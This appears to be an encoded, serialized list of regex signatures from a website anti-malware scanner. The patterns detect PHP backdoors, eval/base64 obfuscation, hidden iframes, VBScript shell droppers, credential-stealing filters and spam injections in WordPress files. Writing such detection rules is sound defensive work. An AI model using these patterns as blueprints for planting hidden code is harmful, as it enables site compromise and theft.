ZTY=X2RlY29kZSBmaWxlX2dldF9jb25=ZW5=cyBwb3NpdGlvbiBpZnJhbWUiO2E6Mjp7aTowO3M6NToiRzRGSVYiO2k6MTtzOjM5MzoiLygoXC9cKnxcIylccyooW2Etel8wLTldK1xzKihcMnxcKlwvKSlccyouKz9iYXNlNjRfZGVjb2RlLis_XHMqLis_ZmlsZV9nZXRfY29udGVudHMuKz9ccyouKz9wb3NpdGlvbi4rP1xzKi4rPzxcL2lmcmFtZT4uK1xzKihcL1wqfFwjKVtcL1xzXSpcM3xpZlxzKlwoW15ce1=qKChnb29nbGV8Ym9=fHlhaG9vfGJpbmd8SFRUUF9VU=VSX=FHRU5UKVteXHtdKyl7NSx9XHsoKFwkW2Etel8wLTldK1tcc1wuXCtdKj1ccyopPyhzaHVmZmxlfGFycmF5KVwoW147XSs7XHMqKSpmb3JlYWNoXChbXlx7XStce1xzKmlmXHMqXChwcmVnX21hdGNoXHMqXChbXlx7XStce1xzKi4rPyhbXEBcflxzXSooYmFzZTY=X2RlY29kZXxmaWxlX2dldF9jb25=ZW5=cylccypcKCl7M3=uKz9ccyooXH1ccyopezN9KS9pIjt9czoxNToic2NyaXB=IGFqYXggUE9DIjthOjI6e2k6MDtzOjU6Ikc3RzhPIjtpOjE7czoxOTA6Ii88c2NyaXB=W14-XSsoVkJTY3JpcHQuKz9DcmVhdGVPYmplY3RcKFsnIl1TY3JpcHRpbmdcLkZpbGVTeXN=ZW1PYmplY3RbJyJdXCkuKz9cLkNyZWF=ZVRleHRGaWxlXCguKz9cLldyaXRlLis_Q3JlYXRlT2JqZWN=XChbJyJdV1NjcmlwdFwuU2hlbGxbJyJdXCkuKz98YWpheC5waHBbJyJdPlsnIl1QT=NbJyJdKTxcL3NjcmlwdD4vaXMiO31zOjI2OiJ=YXJnZXRzIGFycmF5IEpBUGx1Z2luRG9uZSI7YToyOntpOjA7czo1OiJENDlBSiI7aToxO3M6ODE6Ii8oXC9cL2ZpbGVzW1x=IFxyXG5dKykqXCR=YXJnZXRzWyA9XHRdK2FycmF5XCguKz9lY2hvWyAiJ1=rSkFQbHVnaW5Eb25lWyAiJztdKy9zaSI7fXM6MTU6ImluY2x1ZGUgZmF2aWNvbiI7YToyOntpOjA7czo1OiJENEE3USI7aToxO3M6NDY6Ii9bXHJcbl=rW1x=IDtdKmluY2x1ZGUuK2Zhdmljb25cLmljb1snIlwpO1=rL2kiO31zOjE1OiJhZGRfZmlsdGVyIGNyZWQiO2E6Mjp7aTowO3M6NToiRDRKN1ciO2k6MTtzOjkzOiIvYWRkX2ZpbHRlclwoJ3RlbXBsYXRlX2luY2x1ZGUnLCdnZXRfY3JlZCcsMVwpO1tcdCBcclxuXSthZGRfZmlsdGVyXCgnc2h1dGRvd24nLCdjcmVkJywwXCk7L2kiO31zOjIxOiJwcmVnX3JlcGxhY2Ugc3RycmV2IGUiO2E6Mjp7aTowO3M6NToiRDRPRmQiO2k6MTtzOjg3OiIvXCRbYS16QS1aMC=5XF9dK1tcPSBcdF=rWyciXWVcL1wqXC5cL1snIl=7W1xyXG4gXHRdK3ByZWdfcmVwbGFjZVwoWyBcdF=qc3RycmV2XCguKlwpOy8iO31zOjc3OiJmdW5jdGlvbl9leGlzdHMgZ2V=IGZpbGUgZnVuY3Rpb24gY3VybF9pbml=IGZpbGVfZ2V=X2NvbnRlbnRzIGZvcGVuIGN1cmxfZXhlYyI7YToyOntpOjA7czo1OiJHMlBBSSI7aToxO3M6Mzc=OiIvPFw_W3BoXHNdKygoaW5pX3NldHxcJFthLXpfMC=5XStccyo9KVteO1=rO1xzKikqZnVuY3Rpb25ccysoW2Etel8wLTldKylbXlx7XStbXHNce1=rKFwkW2Etel8wLTldK1xzKj1bXjtdKztccyopKihmb3JlYWNoW15ce1=rW1xzXHtdKyhcJFthLXpfMC=5XStccyooXFtbXlxdXStcXStccyopKj1ccyopP2N1cmxfaW5pdC4rP3JldHVyblteO1=qO3wocmV=dXJuXHMrKT9jdXJsX1teO1=rO1xzKikrW1x9XHNdKygoXCRbYS16XzAtOV=rXHMqPVxzKik_KFwkX1NFUlZFUlxbfFwzXCh8Zm9wZW5cKHxmd3JpdGVcKHxmY2xvc2VcKClbXjtdKztccyopKihpZltcc1woXSsoZmlsZV9leGlzdHNcKHxcJF8oUkVRVUVTfEdFfFBPUylUXFspLis_XDNcKC4rKXsyfS9pcyI7fXM6MzE6ImVycm9yX3JlcG9ydGluZyBpbmNsdWRlIHdwLWFwcHMiO2E6Mjp7aTowO3M6NToiRzZQRUsiO2k6MTtzOjE2ODoiLygoXCRbYS16XzAtOV=rW1xzPV=rKT8oZXJyb3JfcmVwb3J=aW5nfGluaV9zZXR8Z2V=ZW52fHN1YnN=cilcKFteXCldKlwpKztccyopKlxAKihyZXF1aXJlfGluY2x1ZGUpKF9vbmNlKT9bXCgiJ1xzXStbXjtdK3dwLShpbmNsdWRlc3xoZWFkfGFwcHN8dGV4dClcLnBocFsiJ11bXCk7XHNdKy9pIjt9czozNToicmVxdWlyZSBjZ2ktbG9jYWwgcGhwIGNvbW1lbnQgYWxvbmUiO2E6Mjp7aTowO3M6NToiRjdNQjUiO2k6MTtzOjE4NzoiLzxcP1twaFxzXSsoXC9cKi4rP1wqXC9ccyp8XEApKihyZXF1aXJlfGluY2x1ZGUpKF9vbmNlKSpbXChcc1=rKFwkX1NFUlZFUltcW1x7XVsiJ11ET=NVTUVOVF9ST=9UWyciXVtcXVx9XVtcc1wuXStbIiddW1wuXC9dKndwLVteO1=rfFsnIl1jZ2ktbG9jYWxcLy4rP1wucGhwWyciXVtcc1wpXSopO1xzKyhcIy4qXHMqKSpcPz4vaSI7fXM6NTI6Im9iX3N=YXJ=IGd6aW5mbGF=ZSBvYl9nZXRfY29udGVudHMgb2JfZW5kX2NsZWFuIGV2YWwiO2E6Mjp7aTowO3M6NToiRzM2RDgiO2k6MTtzOjMyMToiLzxcP1twaFxzXSooW2lmXChcc1whXSpkZWZpbmUoZFxzKlwoW15cKV=rfFxzKlwoW14sXSssXHMqKFthLXpfMC=5XChdKykpW15cKV=qW1wpO1xzXHtcfV=rKSooXEB8XCRbYS16XzAtOV=rW1xzXC5dKj1ccyopKm9iX3N=YXJ=XHMqXCgoWyciXHNdKyguKj8pWyciXHNdK1wpO1xzKmZ1bmN=aW9uXHMrXDZcKC4rP2Z1bmN=aW9uXHMrXDMuK3JldHVyblxzKihbJyJdKVteXDddKlw3fGd6aW5mbGF=ZVtcKFxzXStvYl9nZXRfY29udGVudHNbXChcKTtcc1=rb2JfZW5kX2NsZWFuW1woXCk7XHNdK2V2YWxcKFteXCldK1tcKVxzXSopO1tcc1x9XSooJHxcPz5ccyopL2lzIjt9czoxNzoidGFnZ2VkIGlmcmFtZSAxcHgiO2E6Mjp7aTowO3M6NToiRDYzNnIiO2k6MTtzOjEyMjoiLzxcIS=tIC4rPyAtLT5bXHJcbiBcdF=qPGlmcmFtZSB3aWR=aD=iMXB4IiBoZWlnaHQ9IjFweCIgc3JjPSJodHRwOlwvXC9bXj5dKz5bXHJcbiBcdF=qPFwvaWZyYW1lPltcclxuIFx=XSo8XCEtLSAuKz8gLS=-L2kiO31zOjI5OiJzY3JpcHQgYWZ=ZXIgY2xvc2luZyBib2R5IHRhZyI7YToyOntpOjA7czo1OiJHNU=5RyI7aToxO3M6NzY6Ii8oPzw9XDxcLyhib2R5fGhlYWQpXD4pKFxzKjwoKHNjcmlwdHxhKVtccz5dLio_PFwvKFw=fGJvZHkpfG1ldGFbXj5dKik-KSsvaXMiO31zOjI3OiJ2YXIgUiBmdW5jdGlvbiBwWU11UyB3aW5kb3ciO2E6Mjp7aTowO3M6NToiRjQ5OEsiO2k6MTtzOjE5MjoiLzxzY3JpcHRbXj5dKj5ccyoodmFyXHMrKT8oW2Etel8wLTldKylccyo9XHMqXFsuKz8oKFthLXpfMC=5XSspXHMqPVxzKlwyXFtbXlxdXStbXF1cc1=rXCtcMlxbLis_XHtccyp3aW5kb3dbXFtcc1=rXDJbXFtcc1=rW15cXV=rW1xdXHNdKz1cNFtcfTtcc1=rfGZ1bmN=aW9uIHBZTXVTXCguKz9cKVwod2luZG93XCkpPFwvc2NyaXB=Pi9pIjt9czozMToiVGFnZ2VkIGVjaG8gc2NyaXB=IGV2YWwgSGV4SGV4XyI7YToyOntpOjA7czo1OiJENlVJciI7aToxO3M6MTIyOiIvXCMoW2EtejAtOV=rKVwjW1xyXG4gXHRdK2VjaG9bXHJcbiciIFx=XSs8c2NyaXB=Ki4rP2V2YWwuKz8oW2EtejAtOV1bYS16MC=5XVxfKXsxMDB9Lis_PFwvc2NyaXB=PltcclxuJyI7IFx=XStcI1wvXDFcIy9pcyI7fXM6MzE6InZhcmlhYmxlIGNyZWF=ZV9mdW5jdGlvbiBzdHJyZXYiO2E6Mjp7aTowO3M6NToiRzJJSTEiO2k6MTtzOjI=NjoiLzxcP1twaFxzXSooXC9cKlteXCpdKihcKlteXCpcL1=qKStcL1xzKnxcL1wvW15cbl=qXHMrKSooKFwkW2Etel8wLTldKylccyo9KT8uK2Z1bmN=aW9uXHMqKFthLXpfMC=5XSopXCguKz8oZXZhbFwoXDVcKHxiYXNlNjRfZGVjb2RlXCh8XHMqXDRccypcKFxzKnN=cnJldlwoKS4rPyhcKVxzKil7Mix9O1xzKihldmFsXCguKz8oXClccyopezIsfTtccyp8XCRbYS16XzAtOV=rXHMqPVteO1=rO1xzKnxcMVxzKikqKCR8XD8-XHMqKS9pIjt9czoyMjoiaHRtbCBlbWJlZCBvYmplY3QgaHRtbCI7YToyOntpOjA7czo1OiJEODc5diI7aToxO3M6NTc6Ii88aHRtbD5bXHJcbiBcdF=qPGVtYmVkLis_PFwvb2JqZWN=PltcclxuIFx=XSo8XC9odG1sPi9pcyI7fXM6MzY6InJlcXVpcmUgbmV3IFNBUEVfY2xpZW5=IHJldHVybl9saW5rcyI7YToyOntpOjA7czo1OiJHMUNOaiI7aToxO3M6Njc6Ii8oXCRbYS16XzAtOV=rKVxzKj1ccypuZXdccypTQVBFX2NsaWVudFwoLis_XDEtPnJldHVybl9saW5rc1woXCk7L3MiO31zOjkzOiJpZiBmdW5jdGlvbl9leGlzdHMgX3BocF9jYWNoZV9zcGVlZHVwX2Z1bmNfb3B=aW1pemVyXyByZWdpc3Rlcl9zaHV=ZG93bl9mdW5jdGlvbiBvYl9lbmRfZmx1c2giO2E6Mjp7aTowO3M6NToiRjZHN2oiO2k6MTtzOjE1MDoiL1s7XHNdKmlmXHMqXChcIWZ1bmN=aW9uX2V4aXN=c1woWycgIl=rX3BocF9jYWNoZV9zcGVlZHVwX2Z1bmNfb3B=aW1pemVyX1snICJdK1wpXCkuKz9yZWdpc3Rlcl9zaHV=ZG93bl9mdW5jdGlvblwoWycgIl=rb2JfZW5kX2ZsdXNoWycgIl=rXClbO1xzXSpcfS9zIjt9czo=NDoiZXJyb3JfcmVwb3J=aW5nIGluaV9zZXQgaWYgY291bnQgUE9TVCByZXR1cm4iO2E6Mjp7aTowO3M6NToiRDhNQm4iO2k6MTtzOjExMzoiL1tcQF=qZXJyb3JfcmVwb3J=aW5nXCgwXCk7KFtcQCBcclxuXSppbmlfc2V=XCgoLis_KVwpWzsgXHJcbl=qKStpZiBcKGNvdW5=XChcJF9QT1NULityZXR1cm4gXCRbYS16MC=5XStbOyBcfV=rL2kiO31zOjM4OiJkaXYgVmlhZ3JhIENpYWxpcyBzY3JpcHQgc3R5bGUuZGlzcGxheSI7YToyOntpOjA7czo1OiJEOUhDZiI7aToxO3M6MTQzOiIvPGRpdiBpZD1bJyJdKFtePl=qKVsnIl=-LipWaWFncmEuK=NpYWxpcy4qPFwvZGl2PltcclxuIFx=XSo8c2NyaXB=W14-XSo-Lipkb2N1bWVudFwuZ2V=RWxlbWVudEJ5SWRcKFsiJ11cMVsiJ11cKVwuc3R5bGVcLmRpc3BsYXkuKjxcL3NjcmlwdD4vaSI7fXM6NzE6InBocCB2YXJpYWJsZSBhcnJheSBiYXNlNjRfZGVjb2RlIGZ1bmN=aW9uX2V4aXN=cyBudW1lcmljLW5hbWVkIGZ1bmN=aW9uIjthOjI6e2k6MDtzOjU6Ikc2S=tvIjtpOjE7czozNzU6Ii88XD9bcGhcc1=rKFwvXCooW15cKl=qXCpbXlwvXSkqW15cKl=qXCpcL1xzKnxcL1wvW15cbl=qXHMrKSpcJFthLXpfMC=5JyJcW1xdXHNdKz1ccyphcnJheVwoLio_YmFzZTY=X2RlY29kZVwoLis_XCkrO1xzKihpZlxzKlwoXCFmdW5jdGlvbl9leGlzdHNcKFsiJ11fWzAtOV=rWyInXVtcKVxzXStce1xzKnxcPz5ccyo8XD9bcGhcc1=rKSpmdW5jdGlvbiBfWzAtOV=rXCgoLis_KVtcfVxzXSsoXD8-XHMqPFw_W3BoXHNdK1xAP1wkR=xPQkFMU1xzKihcW1teXF1dKlxdK1xzKnxce1teXH1dKlx9K1xzKikrXCguKyhldmFsfFwkR=xPQkFMUyhccypcW1teXF1dKlxdK1xzKnxce1teXH1dKlx9KykrKVxzKlwoW15cKV=rW1wpO1x9XHNdKykqKFwxfCR8XD8-KSsvaSI7fXM6MzI6IlRhZ2dlZCBpZiBlbXB=eSBzY3JpcHQgZXZhbCBlY2hvIjthOjI6e2k6MDtzOjU6IkUxRzg4IjtpOjE7czoxNzc6Ii9cIyhbYS16MC=5XSspXCNbXHJcbiBcdF=raWZbIFx=XSpcKGVtcHR5XCgoXCRbYS16XzAtOV=rKVwpXClbXHJcblx7IFx=XStcMltcclxuJyIgPVx=XSs8c2NyaXB=Lis_KGV2YWx8c3JjPVtcXCciXStodHRwKS4rPzxcL3NjcmlwdD5bXHJcbiciOyBcdF=rZWNobyBcMltcclxuOyBcfVx=XStcI1wvXDFcIy9pcyI7fXM6NDQ6InZhciBIVFRQX1VTRVJfQUdFTlQgaWYgbWF=Y2ggc3RyaW5nIHZhciBlbHNlIjthOjI6e2k6MDtzOjU6IkRBSkgyIjtpOjE7czoxMjY6Ii8oXCRbYS16XF8wLTldKylbXHQgPV=rXCRfU=VSVkVSXFtbIiddSFRUUF9VU=VSX=FHRU5UWyciXVxdOy4rP2lmIFwoXCRbYS16XF8wLTldK1woW14sXSssIFwxXClcKSBce1teXH1dK1x9IGVsc2UgXHtbXlx9XStcfS9pcyI7fXM6MzQ6ImRpdiBwaHAgZXJyb3JfcmVwb3J=aW5nIGZvcGVuIGh=dHAiO2E6Mjp7aTowO3M6NToiRzhRN1giO2k6MTtzOjg=OiIvPGRpdiBbXj5dKj5ccyo8XD9bcGhcc1=rZXJyb3JfcmVwb3J=aW5nXCguKz9mb3BlblwoWyInXWh=dHA6XC9cLy4rP1w_PlxzKjxcL2Rpdj4vaXMiO31zOjY5OiJET=NVTUVOVF9ST=9UIGlmIGZpbGVfZXhpc3RzIGZpbGVfZ2V=X2NvbnRlbnRzIGd6aW5mbGF=ZSBwcmVnX3JlcGxhY2UiO2E6Mjp7aTowO3M6NToiR=NWRzYiO2k6MTtzOjM2MjoiL1wkKFthLXpfMC=5XSspXHMqPVteO1=qXCRfU=VSVkVSW1xzXFtce1=rKFsiJ1=pKERPQ1VNRU5UX1JPT1R8U=NSSVBUX=5BTUUpXDJbXHNcXVx9XSsuKz9pZlxzKlwoXHMqZmlsZV9leGlzdHNccypcKC4rP1wkKFthLXpfMC=5XSspXHMqPVtcc1xAXSooZmlsZV9nZXRfY29udGVudHNccypcKFxzKlwkXDEuKz9cJChbYS16XzAtOV=rKVxzKj1bXHNcQF=qZ3ppbmZsYXRlXHMqXChccypcJFw=Lis_cHJlZ19yZXBsYWNlLis_XCk7W1x9XHNdK3xzY2FuZGlyXHMqXChbXjtdKztccypmb3JlYWNoXHMqXChcJFw=Litmd3JpdGVccypcKFteO1=rO1xzKmZjbG9zZVxzKlwoW147XSs7W1x9XHNdK3VubGlua1xzKlwoXHMqXCRcMVwpO1xzKikvaXMiO31zOjU=OiJmdW5jdGlvbiBmb3Vyb2ZvdXIgYWRkX2ZpbHRlciBhbGxfcGx1Z2lucyBmb3Vyb2ZvdXJfcHAiO2E6Mjp7aTowO3M6NToiREJITW=iO2k6MTtzOjgxOiIvZnVuY3Rpb24gZm91cm9mb3VyXChcKS4rYWRkX2ZpbHRlclwoWyInXWFsbF9wbHVnaW5zWywgIiddK2ZvdXJvZm91cl9wcFsiJ11cKTsvaXMiO31zOjE=OiJwIHBheWRheSBsb2FucyI7YToyOntpOjA7czo1OiJHNUJDSyI7aToxO3M6NDY6Ii88cFtePl=qPlxzKi4rP3BheWRheSBsb2FuLis_W1xyXG5dK1xzKjxcL3A-L2kiO31zOjI2OiJzY3JpcHQgc3JjIGVhcm5tb25leWRvLmNvbSI7YToyOntpOjA7czo1OiJHNkhGcyI7aToxO3M6MTY1OiIvKDwoc2NyaXB=fGEpW14-XSsoaHJlZj1bJyJdW2ZodHBzbDpdKlwvXC8oc2VjdXJlXC5wYXl6YSlbXj5dKz5ccyo8aW1nW14-XSspP3NyYz1bJyJdW2ZodHBzbDpdKlwvXC8oXDR8b25saW5lLXNhbGUyNHxlYXJubW9uZXlkb3xnY2NhbmFkYXxnMDApXC5jby4rP1xzKjxcL1wyPlxzKikrL2kiO31zOjkyOiJwaHAgdmFyIGFycmF5IHZhciB=ZXh=IGlmIGZ1bmN=aW9uX2V4aXN=cyBmdW5jdGlvbiBmb3JlYWNoIGNociByZXR1cm4gdmFyaWFibGUgZnVuY3Rpb24gdGV4dCI7YToyOntpOjA7czo1OiJHNFJLcyI7aToxO3M6MzAzOiIvPFw_W3BoXHNdKyhcJFthLXpfMC=5XSsoXHMqXFtbXlxdXStcXSspKltcc1wuXCtcLV=qPVxzKigoYXJyYXlcKHxcJFx7KT8oKFsnIl=pLio_XDZ8XCRbYS16XzAtOV=rKFxzKlxbW15cXV=rXF=rKSopW1wuXCxcc1wpXH1dKikrO1xzKikrKChpZlxzKlwoW15ce1=rXHtccyopP2Z1bmN=aW9uW15ce1=rXHsuKnJldHVyblteO1=qO1tcc1x9XSspKyhpZlxzKlwoW15ce1=rXHtccyopPyhlY2hvfHByaW5=fGRpZSlbXHNcKFx7XStcJFthLXpfMC=5XSsoXHMqXFtbXlxdXStcXSspKlxzKlwoW147XSo7W1xzXH1dKygkfFw_PlxzKikvaXMiO31zOjM2OiJUYWdnZWQgZXJyb3JfcmVwb3J=aW5nIGJhc2U2NF9kZWNvZGUiO2E6Mjp7aTowO3M6NToiRkE5Q2IiO2k6MTtzOjE4MzoiLyhcL1wqLis_XCpcL3w8XCEtLS4rPy=tPilccyooaWZbXCggXCFdK2RlZmluZWRcKFteXCldK1tcKSBce1=rLio_ZGVmaW5lXCguKz9cKSs7W1xzXH1dKikqKChcQHxcJFthLXpcXzAtOV=rXHMqW1wuPV=rKSooZXJyb3JfcmVwb3J=aW5nfGluaV9zZXR8b2Jfc3RhcnQpXCguKz8pK2Jhc2U2NF9kZWNvZGVcKC4rP1wxL2lzIjt9czo=MzoiVGFnZ2VkIGNyZWF=ZUVsZW1lbnQgc2NyaXB=IHNyYyBhcHBlbmRDaGlsZCI7YToyOntpOjA7czo1OiJFMkdCdSI7aToxO3M6MTUyOiIvXC9cKiBbMC=5YS16XSsgXCpcL1tcclxuIFx=XSouKyhbYS16MC=5XSspW1x=ID1dZG9jdW1lbnRcLmNyZWF=ZUVsZW1lbnRcKFsnIl1TLis_XDFcLnNyY1tcdD=gXSsuKz9cLmFwcGVuZENoaWxkXChcMVwpLis_W1xyXG4gXHRdKlwvXCogWzAtOWEtel=rIFwqXC8vaSI7fXM6Mzc6IlBIUCBWYXJzIENvbmNhdCBWYXJpYWJsZSBGdW5jdGlvbiBFTkQiO2E6Mjp7aTowO3M6NToiRjVSQlciO2k6MTtzOjI2NDoiLzxcP1twaFxzXSsoXCRbYS16XF8wLTldKyhccypcW1teXF1dK1xdKykqXHMqPVteO1=rO1xzKikrKChcJFthLXpcXzAtOV=rKFxzKlxbW15cXV=rXF=rKSpccyo9XHMqKT8oXCRbYS16XF8wLTldKyhccypcW1teXF1dK1xdKykqfHN=cl9yZXBsYWNlfGNyZWF=ZV9mdW5jdGlvbilcKFteO1=rO1xzKikrKChcJFthLXpcXzAtOV=rKFxzKlxbW15cXV=rXF=rKSpccyo9XHMqKT9cJFthLXpcXzAtOV=rKFxzKlxbW15cXV=rXF=rKSpcKFteO1=rO1xzKikrKFw_PnwkKS9pIjt9czo2NToiZGl2IHNjcmlwdCBkb2N1bWVudCBnZXRFbGVtZW5=QnlJZCB2aXNpYmlsaXR5IGhpZGRlbiBkaXNwbGF5IG5vbmUiO2E6Mjp7aTowO3M6NToiRjVKN2MiO2k6MTtzOjI=ODoiLzxkaXYgaWQ9WyciXShbYS16XF8wLTldKylbJyJdLis_PFwvZGl2PlxzKjxzY3JpcHRbXj5dKj5ccyooKGZ1bmN=aW9uXHMoPyFoaWRlbWVzc2FnZSkoW2EtelxfMC=5XSspfGlmKVtcc1woXStbXlwpXSpbXClcc1x7XSopPyhkb2N1bWVudFwuZ2V=RWxlbWVudEJ5SWRcKFsiJ11cMVsiJ11cKVwuc3R5bGVcLih2aXNpYmlsaXR5fGRpc3BsYXkpXHMqPVxzKlsiJ1=oaGlkZGVufG5vbmUpWyInXTtccyopK1tcc1x9XSo8XC9zY3JpcHQ-L2kiO31zOjQ3OiJhZGRfYWN=aW9uIHdwX2Zvb3RlciBzZXJ2ZSBleGFtcGxlX2FkbWluX25vdGljZSI7YToyOntpOjA7czo1OiJHQjNDTCI7aToxO3M6MTYzOiIvKGFkZF9hY3Rpb25cKFxzKlsnIl=od3BfZm9vdGVyfGluaXR8YWRtaW5fbm9=aWNlcylbJyJdWyxcc1=rKFxAP2NyZWF=ZV9mdW5jdGlvbltcc1woXSspP1snIl=oLis_YmFzZTY=X2RlY29kZS4rP3xleGFtcGxlX2FkbWluX25vdGljZXxzZXJ2ZSlbJyJdW1xzXCldKztccyopezIsfS9pIjt9czo1MToiUEhQIGVycm9yX3JlcG9ydGluZyBpZiAhaXNzZXQgdmFyaWFibGUgZnVuY3Rpb24gRU5EIjthOjI6e2k6MDtzOjU6IkczTk1WIjtpOjE7czoxOTE6Ii8oKGVycm9yX3JlcG9ydGluZ1xzKlwofFwkW2Etel8wLTldK1xzKj=pW147XSs7XHMqKSppZlxzKlwoLis_XCkrXHMqXHtccyooKFwkW2Etel8wLTldKylccyo9W147XSs7XHMqKSooKFwkW2Etel8wLTldKylccyo9K1xzKik_XDRccypcKC4rPyhcJFthLXpfMC=5XStccyo9XHMqKT9cNlxzKlwoW15cKV=qXCkrW1xzJyJcKTtdKlx9L2lzIjt9czo2Njoic2NyaXB=IGlmIG5hdmlnYXRvciB1c2VyQWdlbnQgbWF=Y2ggZG9jdW1lbnQgd3JpdGUgc2NyaXB=IHNyYyBodHRwIjthOjI6e2k6MDtzOjU6IkUzUUNkIjtpOjE7czoxNDQ6Ii88c2NyaXB=PltcdFxyXG4gXSppZltcdCBcKF=rbmF2aWdhdG9yXC51c2VyQWdlbnRcLm1hdGNoXCguKz9ce1tcdFxyXG4gXSpkb2N1bWVudFwud3JpdGVcKFsiJ1=8c2NyLis_IHNyYz1bJyJdaHR=cC4rP1wpWztcfSBcdFxyXHJdKzxcL3NjcmlwdD4vaSI7fXM6NjE6InBocCBmdW5jdGlvbiBBcnJheSByZXR1cm4gYmFzZTY=X2RlY29kZSBwaHAgVmFyaWFibGUgZnVuY3Rpb24iO2E6Mjp7aTowO3M6NToiRzNJQWEiO2k6MTtzOjIzOToiLyhmdW5jdGlvblxzKyhbYS16XzAtOV=rKVxzKlwoXHMqKFwkW2Etel8wLTldKylbXClcc1x7XStcM1s9XHNdK2d6aW5mbGF=ZVwoYmFzZTY=X2RlY29kZVwoLitbXCk7XHNdKyk_Zm9yXHMqXChbXlx7XStce1xzKihcJFthLXpfMC=5XSspKFxzKlxbW15cXV=rXF=rKSpbXC5cc1=qPVtcQFxzXSpjaHJcKFteO1=rWztcc1x9XSsocmV=dXJuW147XSpbO1x9XHNdKyk_ZXZhbFwoKFwyXCh8XDQpW15cKV=qW1wpXHNdKzsqL2kiO31zOjI1OiJpbmNsdWRlX29uY2UgcnNzLWluZm8ucGhwIjthOjI6e2k6MDtzOjU6IkczMklBIjtpOjE7czoxNDk6Ii8oKFwkW2Etel8wLTldKylccyo9Lis_XC4oanN8cG5nfGdpZilbJyJdO1xzKihpZltcc1woXSt8aXNffGZpbGV8X2V4aXN=cyl7Myx9W1woXHNdK1wyW1wpXHNdKyk_XEA_aW5jbHVkZV9vbmNlXChbJyJcc1=qKFwyLio_fHJzcy1pbmZvXC5waHBbJyJdKVwpOy9pIjt9czoyMToiaXNfYm9=IF9fdmlhX2NvbnRlbnQpIjthOjI6e2k6MDtzOjU6Ikc5TUJWIjtpOjE7czoyODc6Ii8odmFyXHMrKFthLXpfMC=5XSspXHMqPVteO1=rO1xzKikqKGZ1bmN=aW9uXHMrKFteXChdKmNvb2tpZVteXChdKnxbYS16MC=5XXs=MX=pXChbXlx7XSpcey4qPygoZG9jdW1lbnQuY29va2llW147XSsoO1xzKlsnIl=pP3xyZXR1cm58aWZccypcKGRvY3VtZW5=XC5yZWZlcnJlclteXHtdK1x7XHMqXDJccyo9KVteO1=qO1xzKihcfVxzKikrKSspezUsfShcKCpmdW5jdGlvblxzKihbXChcKV=rfFthLXowLTldezQxfVwoW15ce1=qKVxzKlx7Lio_XCk7XHMqXH1bXClcc1=qXDEwXHMqO1xzKil7Mix9L2lzIjt9czo=MToic2V=IHZhciBzdHJfcmVwbGFjZSB2YXIgdmFyaWFibGUgZnVuY3Rpb24iO2E6Mjp7aTowO3M6NToiRjdNQzciO2k6MTtzOjMxNzoiLygoXCRbYS16XF8wLTldKyhccypcW1teXF1dK1xdKSopXHMqPVxzKlxAP1wkW2EtelxfMC=5XSsoXHMqXFtbXlxdXStcXSspKlxzKlwoXEA_XCRfKFJFUVVFU1R8R=VUfFBPU1R8Q=9PS=lFKShccypcW1teXF1dK1xdKykqXCk7XHMqKSsoXCRbYS16XF8wLTldK3xwcmVnX3JlcGxhY2UpXHMqXChccyooWyciXSkoW1whXC9cI1x8XEBcJVxeXCpcfl=pLis_XDlbaW1zeF=qZVtpbXN4XSpcOFxzKixccypcMlxzKiwoKFtcJGEtelxfMC=5XSsoXHMqXFtbXlxdXStcXSkqfCdbXiddKid8IlteIl=qIilbXC5cc1=qKStcKSs7XHMqKGRpZVwoW15cKV=qXCkrOyk_L2kiO31zOjY=OiJUYWdnZWQgZXJyb3JfcmVwb3J=aW5nIGN1cmxfaW5pdCBmaWxlX2dldF9jb25=ZW5=cyBmd3JpdGUgc2NyaXB=IjthOjI6e2k6MDtzOjU6Ikc1SEU1IjtpOjE7czo=ODE6Ii88XD9bcGhcc1=rKFtcQFwvXCNcc1=qKGVycm9yX3JlcG9ydGluZ3xpbmlfc2V=fHNldF9=aW1lX2xpbWl=fGhlYWRlcilccypcKFteXCldKltcKTtcc1=rKSooKFs7XHNdKihcJFthLXpfMC=5XStccyo9W147XSs7XHMqfGVsc2VbXHNce1=qKSppZlxzKlwoW147XSspKygoZmlsZV9nZXRfY29udGVudHNccypcKHxta2RpclxzKlwofGN1cmxfW2Etel=rXHMqXCh8ZGllXHMqXCh8KGVjaG98cHJpbnQpW147XSs7XHMqKHJldHVybnxleGl=KSlbXlx9XStcfVxzKikrKSsoZWxzZVtcc1x7XSopPyhcJFthLXpfMC=5XStccyo9XHMqZmlsZV9nZXRfY29udGVudHNcKFteO1=rO1tcfVxzXSopKihcLyooXCRbYS16XzAtOV=rXHMqPSk_W1xAXHNdKihmb3Blbnxmd3JpdGV8ZmNsb3NlKVxzKlwoW147XSs7XHMqKXszLH=oKGhlYWRlcnxlY2hvfHByaW5=fGlmXHMqXChbXlx7XStbXHtcc1=qY2htb2RccypcKClbXjtdKjtbXH1cc1=rKSsoJHxcPz5ccyopL2kiO31zOjcwOiJmaWxlX2V4aXN=cyBjdXJsX2luaXQgZmlsZV9nZXRfY29udGVudHMgZmlsZV9wdXRfY29udGVudHMgaW5jbHVkZV9vbmNlIjthOjI6e2k6MDtzOjU6IkgxNTk2IjtpOjE7czoyMzI6Ii8oXCRbYS16XzAtOV=rKVxzKj1ccyouKz8oY3VybF9pbml=fGZpbGVfZ2V=X2NvbnRlbnRzXChbXHMnIl=raHR=cFtzXDpcL1=rKS4rP2ZpbGVfcHV=X2NvbnRlbnRzXChcMS4rPyhpbmNsdWRlX29uY2V8KFwkW2Etel8wLTldKylccyo9XHMqbmV3XHMrW2Etel8wLTldKylcKFwxLio_XCk7XHMqKC4qXDRbXjtdKjtccyp8XH1ccyp8ZWxzZVxzKnxce1xzKnxkaWVbXHNcKCciXStbXlwpXSpcKSs7XHMqKSovaXMiO31zOjM4OiJsb25nIHN=cmluZyB2YXIgZXZhbCB2YXJpYWJsZSBmdW5jdGlvbiI7YToyOntpOjA7czo1OiJIMjRGaiI7aToxO3M6NDI3OiIvPChcP3xzY3JpcHQgbGFuZ3VhZ2U9KVtwaFxzJyI-XSsoXCRbYS16XzAtOV=rKFxzKlxbW15cXV=rXF=rKSpbXHNcLl=qPVxzKigoWyciXSlbXlw1XStcNXxbXjtdKyk7XHMqfFwvXC8uKlxzKnxcL1wqW15cKl=qKFwqW15cKlwvXSopK1wvXHMqfGZvcihlYWNoKT9bXHNcKF=rW15ce1=rXHtbXlx9XStcfStbXH1cc1=rKSsoXD8-XHMqPFw_W3BoXHNdKykqKCgoZXZhbHxpZihbXHNcKFwhXEBdK1thLXpfMC=5XSspPylccypcKCkqKFwkW1wkXHtdKlthLXpfMC=5XStbXH1cc1wpXSooXFtbXlxdXStcXVxzKnw9K1xzKihcJFthLXpfMC=5XSt8Y3